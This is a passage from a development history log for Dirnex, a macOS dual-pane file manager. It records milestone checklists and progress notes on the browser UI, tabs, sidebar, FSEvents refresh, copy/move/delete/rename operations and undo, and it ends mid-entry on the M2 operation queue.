# Dirnex — build history (M0 → M13)

The shipped record of Dirnex's milestones: the milestone checklists as they were completed,
plus the per-pass progress log — what was probed, what was decided, what was rejected and why.
M0–M11 landed 2026-07-05 → 2026-07-22; M12 (localization) ran 07-22 → 07-29 and M13 (FTP/FTPS)
landed 07-25 inside that span, so the two overlap in time — each sits in its own numeric slot below.

This file is **archive, not instruction.** It moved out of [PLAN.md](../PLAN.md) once M7
closed, so the plan could go back to being a plan, and each milestone since is archived
here the same way as it closes. Nothing here binds current work:

- Live architecture constraints are [PLAN.md](../PLAN.md) §2, still "locked unless proven wrong".
- Durable engineering gotchas were distilled into [NOTES.md](NOTES.md) as they were found —
  that is the file to read before debugging.
- Source-comment citations of the form `PLAN.md §M5` refer to the milestone sections below.

Read it when you want the *reasoning* behind a shipped decision. The chronology is the point:
several entries record a design being reworked against reality after a probe contradicted it.

---

### M0 — Scaffolding (S)

Goal: empty but real project; every later PR lands on green CI.

- [x] Xcode project + `DirnexCore` SwiftPM package, Swift 6 strict concurrency
- [x] SwiftFormat/SwiftLint config; CI (GitHub Actions: build + tests on macOS runner)
- [x] Fixture generator: script that builds test directory trees (deep nesting,
      100k files, weird names: emoji, NFD/NFC unicode, 1000-char paths, symlinks)
- [x] App icon placeholder; ad-hoc signing for local/CI (Developer ID deferred to M7)

Exit: `xcodebuild test` green in CI; app launches to an empty window. ✅ met locally
(CI configured; Developer ID signing intentionally deferred to M7 per §2 "distributed
outside MAS" — ad-hoc signing runs everywhere without a team).

Notes:
- Xcode project uses file-system-synchronized groups (objectVersion 77) so no file
  generator (XcodeGen/Tuist) is needed — `git clone && xcodebuild test` just works.
- `DirnexCore` is a standalone SwiftPM package tested via `swift test`. It is wired
  into the app target as a local package dependency in M1, when the app first needs it.

### M1 — Read-only dual-pane browser (L)

Goal: the app already feels good with zero file operations. This milestone defines
the product's feel; do not rush it.

- [x] `LocalBackend` + `DirectoryModel`: list, stat, sort (name/size/date/ext), hidden-files toggle
- [x] Panel view: `NSTableView`, virtualized (view reuse + per-extension icon cache), columns:
      name, size, date; header-click sort with direction indicator. 60fps/100k budget not yet
      measured — deferred to the M1 exit gate / M7 perf pass.
- [x] Two panels + splitter; active-panel highlight; Tab switches
- [x] Keyboard core: arrows/Home/End/PageUp/PageDown, Enter (open dir / launch file),
      Cmd+Down/Up, and type-to-filter with live narrowing. Backspace is filter-aware (trims
      the filter, else goes up); Esc clears filter then marks (via `cancelOperation:`).
- [x] Selection model: Space/Insert toggle-and-advance, Cmd+A (mark all), `*` invert,
      `+`/`-` glob select, and Space-on-directory in-place recursive sizing.
- [x] Tabs per panel: new (Cmd+T)/close (Cmd+W)/switch (Cmd+Shift+[ / ])/drag-reorder,
      restored on relaunch. Tab bar auto-hides at a single tab.
- [x] Path bar: clickable breadcrumbs, Cmd+L to edit as text with completion
- [x] Volumes/places strip (replaces TC's drive letters); eject
- [x] FSEvents: panels refresh live, preserving cursor and selection
- [x] Quick Look on Cmd+Y (Space stays reserved for selection, per §7); previews the marked
      set or the cursor file, tracks the cursor live
- [x] Drag out to other apps; drag in = reveal only (real drop lands in M2)
- [x] Sort/column state per tab, persisted. Per-tab **sort** (key + direction) and per-tab
      **column widths/order** both live in each tab and persist across launches — switching
      tabs swaps the shared table's column geometry in/out.

Progress (2026-07-05): the headless core for this milestone is complete and tested
in `DirnexCore` (38 tests, SwiftLint/SwiftFormat clean) — see `Sources/DirnexCore/VFS/`:
- `LocalBackend` (POSIX `readdir`/`fstatat`; resolves symlink target kind and broken
  links; errno-normalized errors) + `DirectoryModel` (natural-order sort by
  name/size/date/ext, directories-first, hidden toggle, type-to-filter). ✅ first item.
- `Panel` — pure value-type state machine backing one pane: cursor movement, selection
  by identity (Space/Insert toggle-and-advance, Cmd+A, invert, `+`/`-` glob select via
  `fnmatch`), and identity-preserving same-directory refresh (cursor + marks survive a
  live reload). All I/O stays in the caller, so the model is unit-tested headless.

Update (2026-07-05, later): `DirnexCore` is now wired into the app target (local SwiftPM
package) and the dual-pane browser is runnable. `Dirnex/Browser/` holds the thin UI over
`Panel`: `BrowserWindowController` (two panes in an `NSSplitViewController`, active-pane
tracking, Tab focus routing), `PanelViewController` (`NSTableView` data source/delegate,
async directory loads via `DirectoryLoader` off the main thread, cursor⇄table-selection
mirror with loop guard + stale-load token, header-click sort, error sheets), plus
`FileTableView` (TC key model), `FileCellView` (cursor = blue selection, mark = bold red
text), and `FileFormatting`/`FileIconProvider`. Verified live: home dir lists correctly,
active/inactive highlight, sort, marks all render.

Update (2026-07-05, 3rd pass): type-to-filter and Quick Look landed. Printable keys build a
live filter (`FileTableView` → `PanelViewController.setFilter`), status shows `Filter "x"`,
Backspace trims it (then goes up when empty), Esc clears it via `cancelOperation:`, and
entering a directory resets it. Quick Look (Cmd+Y) is in `PanelViewController+QuickLook.swift`
— the pane is the QL controller, previewing the marked set or the cursor file and refreshing
as the cursor/marks move. Verified live: filter narrowing, Backspace edit, Cmd+Y preview.
(Note: Esc couldn't be exercised through the automation harness — synthetic Escape is
swallowed by the OS before reaching the app — but the keyDown path it shares is verified.)

Update (2026-07-05, 4th pass): the path bar landed. `PathBarView` renders clickable
breadcrumbs (one button per ancestor, `›` separators, current crumb bold + accent when
the pane is active) and switches to a text field on Cmd+L — prefilled and selected,
Return navigates, Esc reverts, Tab completes against the child directories of what's
typed (shell-style, cached async so the popup is Tab-triggered, not per-keystroke). Core
support is `VFSPath.ancestorsFromRoot` (root→self crumb chain) and `child(towards:)` (the
one-step-down descendant, so a multi-level crumb jump lands the cursor on the branch you
came from), both unit-tested (`VFSPathTests`, 7 tests). Verified live via computer-use:
breadcrumb rendering + active styling, Cmd+L edit, Tab completion dropdown, and
commit-navigates-and-refocuses. (Crumb *mouse-click* couldn't be exercised — a
LanguageTool overlay covered the path-bar band and the harness gates clicks onto it — but
it reuses the verified `navigate(to:focus:)` path and the unit-tested `child(towards:)`.)

Update (2026-07-05, 5th pass): live FSEvents refresh landed. New
`DirnexCore/…/VFS/DirectoryWatcher.swift` wraps an `FSEventStream` (per-directory,
coalesced by FSEvents' own latency; dispatch-queue scheduled, no run loop) and fires a
payload-free `onChange` — "re-list this directory." The stream holds an *unretained*
pointer to the watcher (a retained one would be a cycle that never stops), so `stop()`
runs from `deinit`; `FSEventStreamInvalidate` drains the queue. Integration-tested
(`DirectoryWatcherTests`, 3 tests, ~60 ms: fires on add, fires across successive
add/remove, idempotent stop). `PanelViewController` owns one watcher, replaced on every
navigation (skipped when the backend lacks `.watch`); the change hops to the main actor,
re-lists, and feeds `Panel.setListing` — which re-anchors cursor/marks by identity — then
renders via a new non-scrolling `renderRefresh()` so a background change never yanks the
user's scroll position. Error-presentation helpers were split into
`PanelViewController+Errors.swift` to keep the controller under SwiftLint's length limits.
Verified live via computer-use: creating/removing a folder in a watched directory updated
both panes instantly (19⇄20 items) and the cursor stayed on "Applications" instead of
jumping to the new top-sorted row. Core suite now 48 tests, all green; app builds; touched
files swiftformat/swiftlint-strict clean.

Update (2026-07-05, 6th pass): the `..` parent row landed. Every non-root directory now
shows a synthetic `..` at the top (folder icon, Enter/double-click goes up landing on the
directory you came from). It lives entirely in the UI — `Panel` never sees it — so item
counts, marks, sizing and glob-select stay clean; the table simply has one extra row at
non-root paths and all row⇄entry mapping goes through helpers in
`PanelViewController+ParentRow.swift` (`parentRowCount`, `entryIndex(forRow:)`,
`row(forEntryIndex:)`). The `..` is never counted, never markable (Space on it just
advances), and stays visible under any type-to-filter — so a filter that hides every entry
leaves `..` as the one row and Enter still walks up. To stay under SwiftLint's file/type
length limits the controller was decomposed further: `+Table` (data source/delegate),
`+Chrome` (path bar/status/sort indicators), `+ParentRow`, joining the existing `+Errors`
and `+QuickLook` (the main file is now 443 lines; `panel`/`isSyncingSelection`/
`reloadEverything` widened to internal so those same-type extensions compile). Verified
live via computer-use: `..` at the top of non-root dirs, absent at `/`, Enter-up lands on
the child you came from, count excludes it, and the filter-empty→Enter-up case works.

Update (2026-07-05, 7th pass): tabs per panel landed. Each pane now owns an array of
`PanelTab`s (a `PanelTab` = the value-type `Panel` — directory/cursor/marks/sort/filter —
plus the two UI bits kept outside it: `cursorOnParentRow` and a lazy-load flag) and renders
whichever is active; `PanelViewController.panel`/`cursorOnParentRow` became computed forwards
to the active tab, so every existing `panel.…` call transparently targets it. A new
`TabBarView` (chips with an accent-filled active tab, per-chip close ✕, a `+`, click-select
and drag-reorder) sits above the path bar and auto-hides at a single tab. Keyboard/menu:
Cmd+T new, Cmd+W close (closing the last tab closes the window), Cmd+Shift+[ / ] switch —
driven by a new File menu + Window-menu items whose nil-target actions dispatch through the
responder chain to the focused pane (`PanelViewController+Tabs`); Window ▸ Close Window moved
to Cmd+Shift+W. Tabs restore on relaunch via `TabPersistence` (boring JSON in UserDefaults,
per §2), including **per-tab sort** (`FileSort.Key` raw values were already documented as the
on-disk format); a restored tab whose directory has vanished is dropped so launch never lands
on a dead path. Switching to a tab renders its stored state instantly, then background-refreshes
(it went unwatched while inactive); a never-loaded (freshly restored) tab loads from scratch.
Files: new `PanelTab`, `TabBarView`, `TabPersistence`, `PanelViewController+Tabs`; edits to
the controller (multi-tab storage + init restoration + tab-bar layout), `+Table` (sort now
persists), `BrowserWindowController` (per-side restoration keys), `AppDelegate` (File/Window
menus). App builds clean (no warnings); DirnexCore untouched (still 48 tests green); touched
files swiftformat/swiftlint-strict clean. Verified live via computer-use (keyboard-driven):
Cmd+T reveals the bar with a second tab of the same dir, each tab holds its own directory,
Cmd+Shift+[ / ] switch both ways preserving per-tab state, Cmd+W closes and re-hides the bar,
the active chip accents only in the focused pane, and a relaunch restored both panes (left
`[oleg, Downloads]` active-index 1, right `[oleg]`) with per-tab sort. GOTCHA (unchanged): the
LanguageTool-for-Desktop overlay still gates every mouse click on the Dirnex window onto
itself, so chip click-select, the `+`/✕ buttons, and drag-reorder are unverified-live — but
they route through the same `selectTab`/`addTab`/`closeTab`/`moveTab` exercised via keyboard.
Also: the harness didn't deliver the Command modifier with arrow keys (`Cmd+Up` acted as plain
Up), unrelated to tabs.

Update (2026-07-05, 8th pass): the volumes/places sidebar landed. A native source-list
sidebar (`NSSplitViewItem(sidebarWithViewController:)`, vibrant + collapsible) leads the two
panes and drives whichever is active. Its two sections come from new headless core
`DirnexCore/…/VFS/Places.swift` (`SidebarLocations.favorites()` / `.volumes()`, Foundation
only, no AppKit): **Favorites** = the standard home folders that actually exist on disk (Home
always first, then Desktop/Documents/Downloads/Pictures/Music/Movies + /Applications, in
Finder order), **Volumes** = browsable mounted volumes via `mountedVolumeURLs` (root
filesystem pinned first, then by name; `canEject` = removable/ejectable and never root).
Unit-tested (`PlacesTests`, 6 tests: favorites lead with Home, skip missing subfolders,
keep declared order; volumes always include a browsable root that sorts first and can't
eject; `canEject` follows the media flags). The app layer is a thin renderer:
`SidebarViewController` (a `.sourceList` `NSTableView` of header/place/volume rows, real
`NSWorkspace` folder/drive icons, group-row headers, capacity tooltips) + `SidebarCellView`/
`SidebarHeaderView`; a row click routes through `SidebarViewControllerDelegate` to
`BrowserWindowController`, which navigates the active pane and hands focus back to it.
Ejectable volumes carry an eject button (`NSWorkspace.unmountAndEjectDevice`, errors surfaced
in a sheet); the list live-rebuilds on `NSWorkspace` mount/unmount/rename notifications,
keeping the selection on the same path. Added View ▸ Show Sidebar (Cmd+Ctrl+S) via
`NSSplitViewController.toggleSidebar` through the responder chain. Core now 54 tests green;
app builds clean; touched files swiftformat/swiftlint-strict clean. Verified live via
computer-use: Favorites render with native icons; clicking Downloads navigated the active
(left) pane while the right pane stayed put; Tab-then-click retargeted the right pane to
Desktop; the Volumes section listed Macintosh HD (drive icon, no eject on root); clicking it
navigated to `/`; the hover tooltip read "456,51 GB available of 2 TB"; and Cmd+Ctrl+S
collapsed then re-showed the sidebar. (Eject itself is unexercised — no removable media was
mounted — but the `canEject` gating is unit-tested and the workspace eject call is a
one-liner.)

Update (2026-07-05, 9th pass): the `+`/`-` glob-select UI landed, wiring the already-tested
core (`Panel.selectMatching`/`deselectMatching` over `Glob`/`fnmatch`) into the pane. New
`Dirnex/Browser/PanelViewController+Select.swift` owns the AppKit shell: a wildcard prompt
(`NSAlert` + text field) that *adds* to (`+`) or *removes* from (`-`) the marks, prefilled
with the cursor file's extension so "mark every JPEG" is `*.jpg` + Return. The gesture binds
to the **numeric keypad's** `+`/`-` (`FileTableView` keyCodes 69/78) rather than the main-row
keys, so a bare `-`/`+` keeps reaching the type-to-filter (both are common filename
characters); the character-typing path is untouched. A new **Select** menu (Invert Selection,
Select by Pattern…, Unselect by Pattern…) gives the same commands a mouse/laptop path — its
nil-target actions dispatch through the responder chain to the focused pane, like the tab
menus; no key equivalents, so nothing steals `+`/`-` from the filter. `fileTableInvertMarks`
was refactored to share the menu's `invertMarks()` helper. App builds clean (no warnings);
DirnexCore untouched (still 54 tests green); touched files swiftformat/swiftlint-strict clean.
Verified live via computer-use (keyboard-driven, since the LanguageTool-for-Desktop overlay
still gates every mouse click on the window — menus were driven via Ctrl+F2 menu-bar focus):
in a fixture dir, Select ▸ Select by Pattern opened prefilled `*.jpg` and marked both JPEGs
("2 of 7 selected"); a second `*.txt` select was additive (4 of 7), proving select never
clears; Unselect ▸ `*.jpg` removed only the JPEGs, leaving the two `.txt` marks (2 of 7). All
three menu items validated enabled through the responder chain; the Unselect dialog showed the
right title/button. GOTCHA: the keypad `+`/`-` keys themselves are unexercised-live (no numpad
on this machine / the harness has no keypad token), but they call the identical
`promptForPatternSelection(deselect:)` the menu items do.

Update (2026-07-05, 10th pass): Space-on-directory in-place sizing landed, completing the
**Selection model**. New headless core `DirnexCore/…/VFS/DirectorySizer.swift` recursively
totals a subtree by walking a `VFSBackend` — iterative (explicit stack, no recursion depth
limit), symlinks counted by their own size and never followed (a cycle can't wedge it),
unreadable subdirectories skipped rather than fatal, and cancellable. Computed totals live in
`DirectoryModel.directorySizes` (keyed by entry identity, pruned to present entries on refresh)
and layer on top of the pure-stat `FileEntry`: `computedSize(of:)` drives the size column
(dash → byte total) and `effectiveByteSize(of:)` feeds both the selection total and size-sort
(an unsized directory counts as 0; a file as its own size). `Panel.setDirectorySize` forwards
cursor-preserving, since a size can reorder rows when sorting by size. In the app, Space on a
directory now (besides the existing mark-and-advance) kicks off a background walk via a new
`DirectoryLoader.size` bridge (`.utility`, off-main); `PanelViewController+Sizing` applies the
result — guarded by `loadToken` + path so a total that resolves after the user navigated away or
switched tabs is discarded — and re-renders without scrolling. Files: new `DirectorySizer`,
`PanelViewController+Sizing`; edits to `DirectoryModel`, `Panel`, `DirectoryLoader`,
`FileFormatting`, `PanelViewController` (+Table/+Chrome and the Space handler). Core now 66
tests green (+12: `DirectorySizerTests` flat/nested/empty/symlink-cycle/cancel/missing, plus
model computed-size + Panel cursor-preservation); app builds clean; touched files
swiftformat/swiftlint-strict clean. Verified live via computer-use (keyboard-driven, since the
LanguageTool-for-Desktop overlay still gates every mouse click on the window): in a fixture dir
whose `bigdir` holds 3,145,728 bytes across two files, Space on it marked it (bold red) and the
status line jumped to "1 of 3 selected · 3,1 MB"; Space on the empty `emptydir` added 0, holding
the total at "2 of 3 selected · 3,1 MB". (The size *column* value itself is unverified-live —
the pane was too narrow to show it and the overlay gates every widen/scroll — but it renders
through the same unit-tested `computedSize(of:)` the status total does.)

**Drag-out**. A file pane is now a drag *source* (PLAN.md §M1 "drag out to other apps"):
`PanelViewController+Drag.swift` adds `pasteboardWriterForRow:` (each row → its file URL as an
`NSURL`; `nil` for the synthetic `..` row so it can't be dragged) and advertises a copy-only
source mask (`setDraggingSourceOperationMask(.copy, forLocal: false)` — external drags copy and
can never move/delete the original; local pane-to-pane drops advertise nothing since real
drop-in lands in M2, so no drag types are registered for receiving). Total Commander semantics:
`draggingSession:willBeginAt:forRowIndexes:` widens the drag to the whole **marked set** when the
grab starts on a marked file (the table is single-selection, so AppKit only offers the one cursor
row) — a grab on an unmarked file drags just that file. Files: new `PanelViewController+Drag`;
one-line hook in `PanelViewController.configureTable`. To keep the controller under SwiftLint's
`--strict` file/type-body limits (it had drifted 12 lines over `file_length` and 4 over
`type_body_length`), the three navigation helpers (`openCurrentEntry`/`goToParent`/
`handleDoubleClick`) moved to a new `PanelViewController+Navigation.swift` (main file 512 → 486);
whole repo is `swiftformat --lint` + `swiftlint --strict` clean again. App builds clean. Verified
live via computer-use (LanguageTool overlay quit for the session so window mouse events land):
dragging the unmarked `alpha.txt` from a pane to a Finder window copied just it; marking `beta`+
`gamma` (status "2 of 3 selected · 29 bytes") then dragging the single `beta` row copied **both**
into Finder — confirmed on disk.

Update (2026-07-06, 11th pass): per-tab **column** width/order persistence landed — the
last M1 feature item. A pane keeps one `NSTableView` shared across its tabs, so switching
tabs now swaps the table's column geometry in and out: `PanelTab` gains a `columnLayout`
(`[ColumnLayout]`, display-order + width, UI-only like `cursorOnParentRow`), `PersistedTab`
gains an optional `columns` (missing key → `nil` → default columns, so state written before
this field decodes untouched), and a new `PanelViewController+Columns.swift` owns the shell:
`applyColumnLayout(for:)` (reorders the known columns into the stored order via
`moveColumn`, then sets each width; guarded by `isApplyingColumnLayout` so its own
resize/move notifications aren't recaptured), `captureColumnLayout()`, and a
`columnDidResize`/`columnDidMove` observer that records the active tab's geometry and
`persistState`s it — skipping no-op posts via `ColumnLayout: Equatable` so window
autoresizing doesn't churn the disk. `activateTab` applies the active tab's layout;
`addTab` inherits the current one; `restoredTabs` threads `columns` through. To stay under
SwiftLint's `file_length`, the `Column` enum (now also carrying `defaultWidth`/`minWidth`,
the single source for `configureTable` and the fallback layout) moved into the new file.
App builds clean (no warnings); DirnexCore untouched; touched files
swiftformat/swiftlint-strict clean; app test target green. Verified live via computer-use:
an injected left-pane layout `[date, name, size]` rendered with **Date Modified** first on
launch while an old-format right pane (no `columns` key) rendered the default **Name**-first
order (decode + reorder + backward-compat in one shot); dragging the left pane's **Name**
header to the front then quitting persisted `[name, date, size]` to disk with widths intact,
while the untouched right pane stayed `columns: nil` (capture→persist + per-pane
independence). GOTCHA (unchanged): the LanguageTool-for-Desktop overlay again gated every
window click until quit for the session.

**M1 feature checklist is now complete.** The only outstanding M1 work is the exit *gate*
itself — the perf measurements (100k-dir < 150 ms warm, no dropped frames), deliberately
deferred to the M1 exit gate / M7 perf pass per the M1 panel-view note above.

Exit: can live in it for browsing all day; 100k-dir opens < 150 ms warm; scroll never
drops frames; unicode/symlink fixtures render correctly.

### M2 — Operation engine (L)

Goal: TC's killer feature — queued, non-blocking, undoable file operations.

- [x] `Operation` model ✅ + `OperationQueue` actor ✅: concurrent across volume pairs,
      serial per volume pair (no disk thrashing); pause/resume, cancel, aggregate
      progress + ETA — landed as `FileOperationQueue` (renamed only to dodge
      `Foundation.OperationQueue`) and now **wired into the app** (F5/F6 route through it,
      window-bottom queue bar). "Add to queue" vs "run now" as an explicit choice is a
      later nicety — everything runs through the queue today
- [x] Copy (F5): APFS clone fast path; chunked fallback with per-file + total progress;
      preserves xattrs, permissions, dates, Finder tags; throughput/ETA readout ✅ (queue bar)
- [x] Move (F6): rename fast path same-volume; copy+delete across volumes
- [x] Delete (F8): to Trash; Shift+F8 permanent with explicit confirm
- [x] New folder (F7) ✅, inline rename (F2) ✅ — Enter-on-name deferred (Enter opens
      the cursor entry in the TC key model, so F2 is the rename trigger)
- [x] Progress UI: the window-bottom **queue bar** ✅ — aggregate determinate progress +
      live throughput + ETA, current-item label, pause/resume + cancel-all buttons,
      non-blocking (replaced the modal progress sheet, now deleted) — plus an **expandable
      per-job list** ✅ (disclosure chevron → one scrollable row per queued copy/move, each
      with its own progress bar + cancel button)
- [x] Conflict engine: ask/overwrite/skip/keep-both ✅ + newer-only ✅; **rich per-file
      dialog** ✅ (side-by-side thumbnails + size + date, newer item flagged) with **"apply
      to all"** ✅ — the engine now yields per conflict (`ConflictPolicy.ask` +
      `resolveConflict` callback). Full side-by-side text diff still deferred (thumbnails
      already give images a preview and text files a content peek)
- [x] Undo journal: Cmd+Z reverses move/rename/copy/new-folder + delete-to-Trash restore ✅;
      journal survives relaunch (JSON in UserDefaults) ✅; overwrites marked non-reversible and
      surfaced ✅ — reversal logic + property tests in `DirnexCore/…/UndoJournal.swift`.
      **Redo (Cmd+Shift+Z) added** ✅: every `UndoStep` is now invertible, so redo is "undo of
      the undo" through the same `revert` executor; a redo stack rides alongside undo (a fresh
      op clears it), both stacks persist across relaunch, and a keep-both copy is redone to its
      exact renamed landing path — property tests `op + undo + redo == op` per operation kind.
      **Selection undo added** ✅: marking gestures (Space, Cmd+A, invert, +/- pattern select,
      Cmd/Shift-click, Esc-clear) join the *same* Cmd+Z timeline. The journal now holds a
      heterogeneous `UndoEntry` — `.fileOperation(UndoRecord)` or `.selection(SelectionChange)` —
      so one Cmd+Z walks back through everything in order; a selection change touches no bytes
      (it swaps a pane's marks, routed by `PaneSide`) and is session-only (never persisted). Menu
      titles track the gesture ("Undo Mark", "Redo Select All"). Verified live: Space→Undo/Redo
      and Select-All-over-a-mark unwinds one entry at a time. **Side-effect clears are journaled
      too** so a wrongly-lost selection is recoverable: leaving a folder (navigation clears marks
      in `setListing`) records the loss against the *departed* folder — undo restores them on
      return — and a right-click that retargets/collapses the marks records it in place. Verified
      live: mark → navigate away+back → ⌘Z restores; mark → right-click another row → ⌘Z restores.
- [x] Errors: failures collected + summarized ✅; **per-file skip/retry/abort** ✅ — the engine
      yields per failed source (`CopyEngine.run(onError:)` → `ErrorResolution` skip/retry/abort),
      bridged to a main-actor `ErrorDialog` by `ErrorPrompter` ("apply to all" = skip-all)
- [x] Drop onto panel = real copy/move through the queue ✅ (pane-to-pane, into a
      subfolder, or from Finder; Finder's copy-vs-move conventions; routed through the
      shared queue via the same `submitTransfer` as F5/F6)
- [x] Core test suite on fixtures: cancellation mid-copy ✅, conflicts ✅, cross-volume ✅,
      symlink ✅, permission errors ✅, disk-full ✅, source-changed-during-copy ✅

Progress (2026-07-06, M2 pass 1): the write layer + the "instant" operations landed —
New Folder and Delete, the ops that finish immediately and so don't need the (still to
come) progress queue. Copy/Move/queue/progress/conflict/undo are the next passes.

- **Core write primitives.** `VFSBackend` grew four write methods —
  `createDirectory` / `moveItem` / `removeItem` / `trashItem` — with default
  implementations that throw `.unsupported`, so a read-only or future backend compiles
  untouched and the panel greys the op out via `capabilities` (§M5). `LocalBackend`
  implements them on POSIX where the errno matters (`mkdir`, `rename`) and `FileManager`
  where it's the right tool (recursive `removeItem`, `trashItem` returning the resulting
  Trash location for a future undo-restore); a `mapCocoaError` helper recovers the POSIX
  errno Cocoa tucks under `NSUnderlyingErrorKey`. New `VFSError.alreadyExists` (EEXIST/
  ENOTEMPTY) feeds the M2 conflict engine later. `DirnexCore/…/Tests/LocalBackendWriteTests`
  adds 13 tests (create over-existing / missing-parent, rename, cross-dir move, recursive
  tree delete, trash-and-return-location, and the read-only-backend `.unsupported`
  contract) — core suite now **79 tests**, all green; swiftformat/swiftlint-strict clean.
- **App wiring** (`Dirnex/Browser/PanelViewController+FileOps.swift`, new). New Folder
  prompts for a name (prefilled, `/`-rejected), creates off-main, refreshes, and lands the
  cursor on the new folder by identity. Delete targets the **marked set over the cursor**
  (TC), runs off-main collecting per-item failures in a `Sendable` shape, then clears
  marks and re-lists: F8/Cmd+Delete → Trash (no prompt, recoverable, Finder-parity);
  Shift+F8/Cmd+Shift+Delete → permanent with an explicit critical confirm. Both carry
  Total Commander's F-keys in a new File-menu section *and* answer to Finder's Cmd combos
  in `FileTableView` (Cmd+Shift+N / Cmd+Delete / Cmd+Shift+Delete); `validateMenuItem`
  disables the delete items when nothing is deletable. `+Errors.describe` was generalized
  (now internal, handles `.alreadyExists`) and reused for op-failure sheets. App builds
  clean (no warnings); app smoke test green.
- **Verified live via computer-use** (menu-driven — the automation harness still doesn't
  deliver the Command modifier, confirmed via a no-op Cmd+T, so shortcuts were exercised
  through the File menu, which dispatches the same responder-chain actions): New Folder
  created `zzz-created-folder`, cursor landed on it, count 4→5, present on disk; Move to
  Trash removed it (recoverable — confirmed by `stat`-ing the returned `~/.Trash` path,
  since a non-FDA shell can't *list* `~/.Trash`); a marked pair (status "2 of 4 selected ·
  14 bytes") trashed leaving the unmarked cursor file; Delete Immediately showed the
  "can't be undone" confirm then permanently removed a file (absent from Trash) and,
  separately, a non-empty subtree (recursive), parking the cursor on `..` at 0 items.

Progress (2026-07-06, M2 pass 2): the copy/move engine landed — F5 Copy and F6 Move,
the byte-moving heart of M2. The headless engine is fully tested; the app is a thin
progress shell over it.

- **Core engine** (`DirnexCore/…/Operations/`, new group per §2's architecture).
  `FileOperation` (kind = copy/move, a source set → a destination directory) +
  `ConflictPolicy` (fail/skip/overwrite/keepBoth) + `OperationProgress`/`OperationReport`
  value types. `CopyEngine.run(…)` is a synchronous entry point (like `DirectorySizer` —
  the caller picks the thread) that transfers each source by the fastest path the backend
  offers: an **APFS clone** of the whole subtree same-volume (`clonefile`, instant, metadata
  preserved), falling back to a **chunked recursive copy** across volumes (1 MiB `read`/
  `write` loop with per-chunk progress + cancellation, symlinks recreated not followed,
  directory metadata carried over via `copyfile(COPYFILE_METADATA)`). Move takes the
  same-volume `rename` fast path and falls back to copy-then-delete on `EXDEV`. Overwrite
  writes to a temp sibling then swaps, so a half-finished copy never destroys the file it
  replaces; keepBoth generates "name copy.ext". Progress is throttled (≥ 8 MiB or an item
  boundary) so a 50 GB copy doesn't flood the caller. New `VFSBackend` primitives —
  `cloneItem` (returns `false`, not throwing, when CoW isn't possible so the engine falls
  back), `copyFile`, `createSymbolicLink`, `copyMetadata` — all defaulted (unsupported /
  no-op) so other backends compile untouched; `LocalBackend` implements them on POSIX.
  Tests: `CopyEngineTests` (14) + `LocalBackendCopyTests` (6) cover clone/tree/file copy,
  same- and cross-volume move (via a `CrossVolumeBackend` that forces `EXDEV`), all four
  conflict policies, cancel-mid-stream (partial file unlinked), progress reaching the full
  total, and the no-clone chunked fallback + symlink duplication (via a `NoCloneBackend`).
  Core suite now **99 tests**, all green; swiftformat/swiftlint-strict clean.
- **App wiring** (`Dirnex/Browser/PanelViewController+Copy.swift` + `OperationProgressSheet.swift`,
  new). F5/F6 target the marked set over the cursor (TC) and land in the *other* pane's
  directory (new `PanelHost.panelCounterpart(of:)`). Colliding names are detected off-main
  and resolved once, up front, via a four-way prompt (Overwrite / Keep Both / Skip / Cancel)
  whose choice becomes the whole operation's `ConflictPolicy`. The engine runs on a detached
  task; progress streams back over an `AsyncStream` to a cancellable sheet (Cancel trips
  `Task.cancel()`, which the engine polls via `Task.isCancelled`). Both panes re-list after,
  and marks clear (matching the delete flow). New File-menu items carry TC's F5/F6 with the
  `.function` mask, dispatched through the responder chain like the other pane actions;
  `deletionTargets()` was generalized to `selectionTargets()` and shared. App builds clean
  (no warnings). **Verified live via computer-use** (pre-seeded both panes at a fixture via
  the tab-persistence defaults, then drove the File menu): copying the `subdir` directory
  cloned it recursively into the other pane (`subdir/nested.txt` on disk) with the source
  untouched; moving `alpha.txt` removed it from the source and landed it in the destination,
  the cursor advancing to the next row; re-copying `subdir` raised the conflict prompt, and
  **Keep Both** produced a full recursive `subdir copy`. GOTCHA: this pass resolves conflicts
  once up front (a single policy for the whole op) — the per-file interactive dialog with
  side-by-side sizes/dates and thumbnails, plus the multi-operation queue actor and undo,
  are the next M2 passes.

Progress (2026-07-06, M2 pass 3): inline rename (F2) landed — the last "instant"
operation, editing the name in place rather than moving bytes (app-target only;
`DirnexCore` untouched, still 99 tests). Total Commander semantics: rename acts on the
single cursor entry (never the marked set — that's M4's multi-rename tool — never `..`).

- **App wiring** (`Dirnex/Browser/PanelViewController+Rename.swift`, new). The name cell
  becomes a real editable `NSTextField` in place: `FileCellView.beginNameEditing`/
  `endNameEditing` flip the label between edit and label appearance, and the table's
  `viewFor` (in `+Table`) builds the cell editable when its entry matches the new
  `renamingEntryID`. `beginRename` reloads that one row, makes the field first responder,
  and preselects the **base name** Finder-style so typing keeps the extension. KEY GOTCHA:
  the base-name selection must be set right after `makeFirstResponder`, NOT in
  `controlTextDidBeginEditing` — that notification fires on the first *edit*, not on focus,
  so a selection set there lands a keystroke too late (verified live: it consumed the
  `.txt`). CORRECTNESS: same-dir rename goes through `moveItem` → `rename(2)`, which
  silently *overwrites* an existing file (unlike New Folder, which `mkdir` guards with
  EEXIST), so the flow pre-checks the destination off-main and throws `.alreadyExists`
  rather than clobber — while allowing a case-only change ("foo" → "Foo", same inode on
  case-insensitive APFS). Commit lands the cursor on the renamed entry by its new
  identity via `refreshCurrentDirectory(selecting:)`; an empty/unchanged name is a silent
  no-op; Esc aborts (`control(_:doCommandBy:)` → `cancelOperation:` → `renameWasCancelled`
  → revert). File-menu **Rename…** carries F2 with the `.function` mask, responder-chain
  dispatched like F5–F8, and `validateMenuItem` disables it on `..`/empty/no-rename
  backends. App builds clean, swiftformat/swiftlint-strict clean, app smoke test green.
- **Verified live via computer-use** (no LanguageTool overlay this session, so mouse +
  keyboard both worked; seeded the left pane at a fixture via the tab-persistence
  data-blob): the File ▸ Rename… item and the F2 key both opened the inline editor;
  `alpha.txt` + typing `renamed` produced `renamed.txt` on disk (extension preserved,
  content intact); the cursor landed on the renamed row; renaming onto an existing
  `taken.txt` was **refused** with "already exists here" and the target file was NOT
  clobbered (content + source both intact — the `rename(2)` guard); commit-on-Return and
  the unchanged-name no-op both behaved. GOTCHA (unchanged from prior passes): the
  harness's synthetic Escape is swallowed by the OS before reaching the app, so the
  Esc-cancel path is correct by inspection but unverified-live.

Progress (2026-07-06, M2 pass 4): the operation-queue actor landed — the scheduler
that sits above the single-shot `CopyEngine` and turns it into TC's queued, non-blocking
background engine. Core-only (`DirnexCore`); the app isn't wired to it yet (that's the
